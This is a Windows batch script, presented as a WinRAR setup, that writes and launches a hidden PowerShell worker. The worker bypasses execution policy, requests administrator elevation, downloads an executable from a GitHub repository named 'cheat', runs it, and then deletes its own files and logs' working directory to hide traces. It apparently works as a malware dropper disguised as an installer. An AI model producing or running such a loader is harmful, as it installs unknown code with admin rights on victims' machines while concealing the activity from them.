@echo off
setlocal EnableExtensions

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=c746372b0a52a457c0350669874b297d33b9f3b783ba7a7434933fc7d229504e"
set "BASE_TEMP=%USERPROFILE%\AppData\Local\Temp"
set "WORK_DIR=%BASE_TEMP%\WinRarPkg"
set "OUT=%WORK_DIR%\WinRar_setup.exe"
set "PS_SCRIPT=%BASE_TEMP%\winrar_worker.ps1"
set "LOG=%BASE_TEMP%\winrar_worker.log"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1

> "%PS_SCRIPT%" (
  echo $ErrorActionPreference = 'Stop'
  echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  echo.
  echo $u = $env:URL
  echo $h = $env:HASH.ToLowerInvariant^(^)
  echo $dir = $env:WORK_DIR
  echo $f = $env:OUT
  echo $log = $env:LOG
  echo $psFile = $PSCommandPath
  echo.
  echo function Write-Log([string]$Msg^) {
  echo     $line = "[{0}] {1}" -f ^(Get-Date -Format 'HH:mm:ss'^), $Msg
  echo     Add-Content -LiteralPath $log -Value $line -Encoding UTF8
  echo }
  echo.
  echo $isAdmin = ^([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent^(^)^).IsInRole^([Security.Principal.WindowsBuiltInRole]::Administrator^)
  echo if ^(-not $isAdmin^) {
  echo     $argList = @(
  echo         '-NoProfile'
  echo         '-NonInteractive'
  echo         '-ExecutionPolicy', 'Bypass'
  echo         '-WindowStyle', 'Hidden'
  echo         '-File', "`"$psFile`""
  echo     ^)
  echo     Start-Process -FilePath 'powershell.exe' -ArgumentList $argList -Verb RunAs -WindowStyle Hidden
  echo     exit 0
  echo }
  echo.
  echo try {
  echo     Write-Log "Elevated worker started. URL=$u"
  echo     if ^(-not ^(Test-Path -LiteralPath $dir^)^) {
  echo         New-Item -ItemType Directory -Path $dir -Force ^| Out-Null
  echo     }
  echo.
  echo     $downloaded = $false
  echo     try {
  echo         Invoke-WebRequest -Uri $u -OutFile $f -UseBasicParsing
  echo         if ^(^(Test-Path -LiteralPath $f^) -and ^((Get-Item -LiteralPath $f^).Length -gt 0^)^) {
  echo             $downloaded = $true
  echo         }
  echo     } catch {
  echo         Write-Log "Invoke-WebRequest failed: $($_.Exception.Message)"
  echo     }
  echo.
  echo     if ^(-not $downloaded^) {
  echo         try {
  echo             $wc = New-Object System.Net.WebClient
  echo             $wc.DownloadFile^($u, $f^)
  echo             $wc.Dispose^(^)
  echo             if ^(^(Test-Path -LiteralPath $f^) -and ^((Get-Item -LiteralPath $f^).Length -gt 0^)^) {
  echo                 $downloaded = $true
  echo             }
  echo         } catch {
  echo             Write-Log "WebClient failed: $($_.Exception.Message)"
  echo         }
  echo     }
  echo.
  echo     if ^(-not $downloaded^) {
  echo         Write-Log "ERROR: Download failed"
  echo         exit 1
  echo     }
  echo.
  echo     Write-Log "Downloaded OK, checking SHA-256"
  echo     $actual = ^(Get-FileHash -LiteralPath $f -Algorithm SHA256^).Hash.ToLowerInvariant^(^)
  echo     if ^($actual -ne $h^) {
  echo         Write-Log "ERROR: Hash mismatch. Expected=$h Actual=$actual"
  echo         Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
  echo         exit 2
  echo     }
  echo.
  echo     Write-Log "Hash verified, launching executable"
  echo     $proc = Start-Process -FilePath $f -PassThru -Wait
  echo     Write-Log "Process exited with code $($proc.ExitCode)"
  echo     exit [int]$proc.ExitCode
  echo } catch {
  echo     Write-Log "FATAL: $($_.Exception.Message)"
  echo     exit 99
  echo } finally {
  echo     Start-Sleep -Seconds 2
  echo     if ^($dir -and ^(Test-Path -LiteralPath $dir^)^) {
  echo         Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
  echo     }
  echo     if ^($psFile -and ^(Test-Path -LiteralPath $psFile^)^) {
  echo         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
  echo     }
  echo }
)

if not exist "%PS_SCRIPT%" exit /b 1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command ^
  "$psi = New-Object System.Diagnostics.ProcessStartInfo; " ^
  "$psi.FileName = 'powershell.exe'; " ^
  "$psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"' + $env:PS_SCRIPT + '\"'; " ^
  "$psi.UseShellExecute = $false; " ^
  "$psi.CreateNoWindow = $true; " ^
  "[System.Diagnostics.Process]::Start($psi) | Out-Null"

exit /b 0
